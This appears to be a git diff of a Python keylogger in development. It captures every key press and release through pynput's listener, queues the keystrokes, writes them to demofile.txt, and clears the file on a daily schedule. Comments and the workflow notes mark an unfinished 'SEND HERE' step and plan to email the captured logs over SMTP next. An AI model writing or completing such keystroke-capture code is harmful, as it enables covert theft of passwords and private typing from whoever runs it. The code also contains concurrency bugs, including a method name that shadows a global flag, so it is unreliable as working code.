@@ -7,10 +7,43 @@ import time
 import schedule
 
 f_lock = threading.Lock()
+exit_ = 0
+send_overwrite = 0
 
 
+class FileManipulator:
+    #the appender w/ the queue
+    @staticmethod
+    def write_queue():
+        with f_lock:
+            f = open("demofile.txt", "a")
 
-class FileManipulator
+            global send_overwrite
+            while send_overwrite != 1:
+                time.sleep(0.5)
+                #try block to handle empty block
+                try:
+                    #get the fifo logg
+                    logg = PyLoggs.keyQueue.get_nowait()
+                    f.write(logg)
+                except queue.Empty as e:
+                    print(f"Queue is empty test successful: {e}")
+
+            f.close()
+
+
+    @staticmethod
+    def send_overwrite():
+        print("TIMER METHOD WAITING TO OVERWRITE")
+        with f_lock:
+            #resetting var so writer can continue
+            global send_overwrite
+            send_overwrite = 0
+            #SEND HERE
+            f = open("demofile.txt", "w")
+            f.close()
+            #REMOVE JUST A TEST
+            time.sleep(3)
 
 
 
@@ -19,39 +52,16 @@ class TheWriter:
     @staticmethod
 #PUSH TO CLASS
     def write_to_file():
-        f = open("demofile.txt", "w")
-
+        FileManipulator.write_queue()
+        ###while loop to check signal on lock to reenter
         while True:
-            time.sleep(0.2)
-            #if the file isn't being erased write to it
-            global currently_dumping
-            if currently_dumping != 1:
-                #try block to handle empty block
-                try:
-                    #get the fifo logg
-                    logg = PyLoggs.keyQueue.get_nowait()
-                    f.write(logg)
-                except queue.Empty as e:
-                    print(f"Queue is empty test successful: {e}")
-            else:
-                f.close()
-                #this will be replaced with block below in final version
-                break
-                '''
-                FINAL PART WE ARE EXITING EARLY FOR PRACTICE
-                while currently_dumping == 1:
-                    time.sleep(1)
-                f = open("demofile.txt", "a")
-                
-                '''
+            print("waiting to reenter queue write")
+            FileManipulator.write_queue()
 
 
 
 class PyLoggs:
-#REMEMBER LATER TO ACTUALLY RESET THOSE VARIABLES
-# * EASY MISTAKE TO FORGET
-
-    #keystroke list
+    #keystroke queue
     keyQueue = queue.Queue(maxsize=-1)
 
     #class method to add key press to list
@@ -71,63 +81,54 @@ class PyLoggs:
 
     @classmethod
     def on_release(cls, key, injected):
+        #exit prog
+        if key == pynput.keyboard.Key.esc:
+            global exit_
+            exit_ = 1
+        #add release to queue
         key_release = '{} released; it was {}'.format(
             key, 'faked' if injected else 'not faked')
         #adding item to end of list
         PyLoggs.keyQueue.put_nowait(key_release)
-        '''
-        if key == pynput.keyboard.Key.esc:
-            # Stop listener
-            return False
-        '''
+
 
     #main method for listen
     @classmethod
     def board_listen(cls):
-        #here we will start our non-blocking listener and then while loop check fo the global variable with a momentary sleep to not spam cpu
+        #listener start
         my_key_lstnr = pynput.keyboard.Listener(
             on_press=PyLoggs.on_press,
             on_release=PyLoggs.on_release)
-        my_key_lstnr.start()#start listener
+        my_key_lstnr.start()
 
-        #this is TESTING REMOVE
-        #this listens for when we will the timer is done reading from the file
-        #and then later will overwrite the file after it send the email
-        global currently_dumping
-        while currently_dumping != 1:
+        #later on just do the basic esc key for prod
+        global exit_
+        while exit_ != 1:
             time.sleep(0.5)
-        my_key_lstnr.stop()#stop listener
+        #stop listener
+        my_key_lstnr.stop()
+        print("stopping logger...")
         time.sleep(20)#just leting io cleanup for tst
 
 
 
 class timer:
-#REMEMBER LATER TO ACTUALLY RESET THOSE VARIABLES
-# * EASY MISTAKE TO FORGET
-
-    '''
-    This method is scheduled for the top of the hour
-    Will set a global var for the writer to stop writing to a file
-    '''
+    #this will call the method to overwrite and send
+    #the queue dumper should see the lock exited as its waiting to reenter
     @staticmethod
-    @schedule.repeat(schedule.every().day.at("11:17"))
+    @schedule.repeat(schedule.every().day.at("22:36"))
     def send_overwrite():
-        #this function sends the email and overwrites the file
-        #this function will set the global variable for the writer to release the lock
-        
-        global currently_dumping
-        currently_dumping = 1
-        #new function
-        #currently_dumping
-        f = open("demofile.txt", "w")
-        f.close()
+        global send_overwrite
+        send_overwrite = 1
+        FileManipulator.send_overwrite()
+
+
 
     @classmethod
     def run_my_scedule(cls):
         #looping to check the time
         while True:
             schedule.run_pending()
-            #this function will later call the send_overwrite
             time.sleep(1)
 
 
@@ -135,8 +136,8 @@ class timer:
 
 
 def main():
-#REMEMBER LATER TO ACTUALLY RESET THOSE VARIABLES
-# * EASY MISTAKE TO FORGET
+    f = open("demofile.txt", "w")
+    f.close()
 
     #daeomonized thread will exit when all other non-daemons exit
     t_timer = threading.Thread(target=timer.run_my_scedule, daemon=True, args=()).start()
@@ -154,11 +155,9 @@ if __name__ == "__main__":
 
 '''
 Current Workflow
-    > Write the file manipulator methods and locks
-    > Clean up the other classes
-      > Just implement calls for now
-    > Clean up comments
-    > Then dive further into semaphores and signals.
+    > Set up conditions for waiting
+    > Then we can get to smtp
+
 
 REMEMBER LATER TO ACTUALLY RESET THOSE VARIABLES
   * EASY MISTAKE TO FORGET
